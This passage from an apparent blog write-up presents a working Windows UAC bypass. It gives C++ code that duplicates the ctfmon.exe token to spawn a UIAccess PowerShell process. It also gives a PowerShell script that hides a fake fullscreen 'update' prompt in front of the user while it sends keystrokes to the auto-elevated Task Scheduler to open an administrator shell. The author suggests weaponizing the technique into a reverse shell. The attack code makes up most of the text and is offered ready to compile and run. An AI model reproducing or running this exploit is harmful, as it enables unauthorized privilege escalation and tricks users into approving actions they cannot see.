        std::cerr << "Failed to get token integrity level size: " << GetLastError() << std::endl;
        return false;
    }

    pTILSource = (TOKEN_MANDATORY_LABEL*)malloc(dwSize);
    if (!pTILSource) {
        std::cerr << "Memory allocation failed.\n";
        return false;
    }

    if (!GetTokenInformation(hTokenSource, TokenIntegrityLevel, pTILSource, dwSize, &dwSize)) {
        std::cerr << "Failed to get token integrity level: " << GetLastError() << std::endl;
        free(pTILSource);
        return false;
    }

    // Set the integrity level for the target token
    if (!SetTokenInformation(hTokenTarget, TokenIntegrityLevel, pTILSource, dwSize)) {
        std::cerr << "Failed to set token integrity level: " << GetLastError() << std::endl;
        free(pTILSource);
        return false;
    }

    free(pTILSource);
    return true;
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: <program> <PID of ctfmon.exe>" << std::endl;
        return 1;
    }

    DWORD targetPID = std::stoi(argv[1]);
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, targetPID);
    if (!hProcess) {
        std::cerr << "Failed to open target process: " << GetLastError() << std::endl;
        return 1;
    }

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
        std::cerr << "Failed to open process token: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hCurrentProcessToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hCurrentProcessToken)) {
        std::cerr << "Failed to open current process token: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hNewToken = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation, TokenPrimary, &hNewToken)) {
        std::cerr << "Failed to duplicate token: " << GetLastError() << std::endl;
        CloseHandle(hCurrentProcessToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }

    // Set the integrity level to match the current process
    if (!SetTokenIntegrityLevel(hNewToken, hCurrentProcessToken)) {
        std::cerr << "Failed to set integrity level: " << GetLastError() << std::endl;
        CloseHandle(hNewToken);
        CloseHandle(hCurrentProcessToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }

    // Prepare to create a new process with UIAccess
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;

    WCHAR commandLine[] = L"powershell.exe";
    // Create the process with UIAccess
    if (!CreateProcessAsUser(hNewToken,
        nullptr,
        commandLine, // Replace with your desired process
        nullptr,
        nullptr,
        FALSE,
        CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
        nullptr,
        nullptr,
        &si,
        &pi)) 
    {
        std::cerr << "Failed to create process: " << GetLastError() << std::endl;
        CloseHandle(hNewToken);
        CloseHandle(hCurrentProcessToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "Process created with PID: " << pi.dwProcessId << std::endl;

    // Clean up
    CloseHandle(hNewToken);
    CloseHandle(hCurrentProcessToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
```

compile it, and then run it:

![image](https://github.com/user-attachments/assets/469b1d72-0a8c-4959-a313-f4960dea967b)

Now, check your newly created powershell process' token privs!

![image](https://github.com/user-attachments/assets/2ce24dd4-406b-4bf4-81a1-3929c4e998ae)

Let's get creative 😸  We can now sendkeys to an elevated program.  So, let's start an autoelevated program we'd like to use to gain administrator privs, say...`taskschd.msc` !

I'm going to use a powershell script to pull this off.  This is actually pretty hilarious.  I made it so it covers the entire screen green with a message telling the user to hit enter and press yes if prompted (In case UAC always on is set)
covering the whole screen with a form only works best if the victim is on a laptop of course.  I'll see if I can capture screenshots of the madness below.  Here's the code:

```ps1
$UACRegKeyPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"

$UACValue = Get-ItemProperty -Path $UACRegKeyPath -Name ConsentPromptBehaviorAdmin | Select-Object -ExpandProperty ConsentPromptBehaviorAdmin

switch ($UACValue) {
    0 { "0 - UAC is disabled (Never notify)." }
    1 { "1 - UAC enabled - Prompt for credentials on the secure desktop (Always notify)." }
    2 { "2 - UAC enabled - Prompt for consent on the secure desktop." }
    3 { "3 - UAC enabled - Prompt for consent for non-Windows binaries." }
    4 { "4 - UAC enabled - Automatically deny elevation requests." }
	5 { "5 - UAC enabled - Prompt for consent for non-Windows binaries." }
    Default { "Unknown UAC setting." }
}


Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.FormBorderStyle = 'None'
$form.WindowState = 'Maximized'
$form.BackColor = [System.Drawing.Color]::Green
$form.TopMost = $true

$form.KeyPreview = $true

$form.Add_KeyDown({
    param($sender, $eventArgs)
    
    if ($eventArgs.KeyCode -eq [System.Windows.Forms.Keys]::Enter) {
        $sender.Close()  
    }
})

$form.Add_Paint({
    param($sender, $event)
    
    $graphics = $event.Graphics
    
    $text = "[ Please hit (Enter) then select (YES) if prompted to continue the update ]"
    
    $font = New-Object System.Drawing.Font("Arial", 36, [System.Drawing.FontStyle]::Bold)
    $brush = [System.Drawing.Brushes]::White

    $textSize = $graphics.MeasureString($text, $font)

    $x = ($form.ClientSize.Width - $textSize.Width) / 2
    $y = ($form.ClientSize.Height - $textSize.Height) / 2

    $graphics.DrawString($text, $font, $brush, $x, $y)
})

$form.Show()

Add-Type @"
using System;
using System.Runtime.InteropServices;

public class User32 {

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool SetForegroundWindow(IntPtr hWnd);
}
"@

Start-Process "cmd.exe" -ArgumentList "/C start taskschd.msc" -NoNewWindow

Start-Sleep -Seconds 5

$taskschd = Get-Process -Name "mmc" -ErrorAction SilentlyContinue

if ($taskschd) {
    
    $hwnd = $taskschd.MainWindowHandle
	
    [User32]::SetForegroundWindow($hwnd)
    
    # Wait a moment for the window to come to the front
    Start-Sleep -Seconds 2

    # Send keystrokes to azman/mmc
    [void][System.Windows.Forms.SendKeys]::SendWait("%")
	[void][System.Windows.Forms.SendKeys]::SendWait("{RIGHT}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{DOWN}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{DOWN}")
    [void][System.Windows.Forms.SendKeys]::SendWait("{DOWN}")
    [void][System.Windows.Forms.SendKeys]::SendWait("{DOWN}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
	Start-Sleep -Seconds 2
	[void][System.Windows.Forms.SendKeys]::SendWait("{TAB}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{TAB}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{TAB}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{TAB}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{TAB}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{TAB}")
	[void][System.Windows.Forms.SendKeys]::SendWait(" ")
	Start-Sleep -Seconds 1
	[void][System.Windows.Forms.SendKeys]::SendWait("cmd{ENTER}")
} else {
    Write-Host "taskschd/mmc is not running."
}

     $form.Close()
```

It cracks me up because this is all happening behind the scenes and when the green screen goes away, the payload will have executed and the user wouldn't have seen it...well...if they were only using one screen lol

Here's screenshots of the process unfolding:

![IMG_5171](https://github.com/user-attachments/assets/6af7748b-6978-44d1-87dc-76061ac17ad6)

I Literally had to take a picture of my computer monitor with my IPhone so you guys could see the results 😄
and the final administrator command shell!  You would obviously want to weaponize this to perform a reverse shell, etc.  But for demonstration purposes I wanted you to see the administrator shell.

![image](https://github.com/user-attachments/assets/c7f1baca-cc9f-4553-bc85-48251841250c)

It's getting late and I need to hop off.  Hope you enjoyed the fresh take on some old tried and true UAC bypass techniques.  Until next time, and hopefully not one year from now...Later!
